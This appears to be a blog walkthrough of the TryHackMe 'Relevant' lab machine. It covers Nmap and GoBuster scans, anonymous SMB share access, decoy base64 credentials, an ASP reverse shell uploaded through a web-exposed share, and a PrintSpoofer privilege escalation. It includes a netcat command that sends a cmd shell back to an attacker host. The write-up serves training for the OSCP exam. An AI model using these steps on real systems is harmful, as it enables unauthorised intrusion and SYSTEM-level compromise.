---
title: TryHackMe | Relevant Writeup
categories: [pentesting]
tags: [tryhackme, oscp, smb]
---

# TryHackMe | Relevant Writeup (No Metasploit)

## Approach
Because I am looking forward getting the OSCP, I will avoid using automatic exploitation tools such as Metasploit or SQLMap.

As I first look into the page, the only thing I see is an IIS Windows Server image, with nothing else in the code, so we start by doing a port scan with Nmap

```console
nmap -sC -sV -p- Target_IP -oN relevant.nmap
```

At the same time I will be running GoBuster with Seclists' web-content wordlist to find interesting directories.

```console
gobuster dir -u Target_IP -w /usr/share/wordlists/seclist/Discovery/Web-Content/big.txt
```

While GoBuster is running I'll take a look to the nmap result

```console
Host is up (0.017s latency).
Not shown: 65526 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2023-06-26T16:22:35
|_Not valid after:  2023-12-26T16:22:35
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2023-06-27T16:42:47+00:00
|_ssl-date: 2023-06-27T16:43:28+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49663/tcp open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 02:93:A8:71:61:09 (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-06-27T09:42:47-07:00
|_nbstat: NetBIOS name: RELEVANT, NetBIOS user: <unknown>, NetBIOS MAC: 0293a8716109 (unknown)
| smb2-time: 
|   date: 2023-06-27T16:42:47
|_  start_date: 2023-06-27T16:22:53
|_clock-skew: mean: 1h23m59s, deviation: 3h07m50s, median: 0s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

We see the machine is running SMB so let's enumerate it.

![SMB enum result 1](/assets/posts/relevant/1.png)

We see a share called "nt4wrksv", we can try to log in anonimously

![SMB enum result 2](/assets/posts/relevant/2.png)

There is an interesting file there, we download it so we can have it handy. Let's take a look at its content.

![passwords.txt content](/assets/posts/relevant/3.png)

The file contais two encoded user passwords, and we see that they are encoded using base64 at a glance. We could decode them using the console but i preffer using CyberChef.

![passwords.txt content decoded](/assets/posts/relevant/4.png)

And here we have it, the passwords for users Bob and Bill.
After getting these credentials I tried to log in with to SMB and with SSH and it didn't work.

![psexec 1](/assets/posts/relevant/5.png)
![psexec 2](/assets/posts/relevant/6.png)

However, using psexec we can know that the user Bill is not even real, and Bob is but the password is wrong.
Here comes the only difficulty of this machine; it is a rabbit hole, as it provides you with fake credentials that have no use at all. So what can we do now?
The GoBuster scan we did at the start didn't file a single directory, so now we can do a couple things: look for vulnerabilities on the services or we can keep enumerating them.

The thing is, both methods can result in compromising the machine, for now I will do the SMB exploitation, because the other options is to use EternalBlue and it's not the objective of this room.

## SMB Exploitation
Let's go for the easy one first. We saw that using GoBuster directly on the main page (port 80) didn't get us any results, but we can enumerate the IIS webserver (port 49663).
<br>
We have found that there is a directory with the name "**nt4wrksv**", just like the SMB share we used to enum. When accessing the link we get a blank page but no errors, so we can try to path traversal to check if we can see the contents of the **passwords.txt** file that was in the share.

![nt4wrksv passwords.txt](/assets/posts/relevant/7.png)

And yes, we can view the file. Now we have access to a SMB share which can be accessed through browser, so let's craft our ASP reverse shell and stablish initial access to the machine.

![put reverse shell](/assets/posts/relevant/8.png)
![shell stablished](/assets/posts/relevant/9.png)

Now we have a shell and list the users to get the first flag.
![User flag](/assets/posts/relevant/10.png)

### Privilege escalation
First we check for exploitable tokens
```console
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

We have the **SeImpersonatePrivilege** token enabled, so no big deal to gain root acess. To do this we will upload PrintSpoofer and a netcat binary. Once we have both uploaded, we start another listener and run PrintSpoofer. You should get a bind shell with this command
```PrintSpoofer.exe -c “c:\inetpub\wwwroot\nt4wrksv\nc.exe LHOST LPORT -e cmd”```, but because we just need to check one flag and nothing else I decided to invoke a SYSTEM shell on the same session with ```PrintSpoofer.exe -i -c cmd```.

![Root flag](/assets/posts/relevant/11.png)

Finally we get the root flag.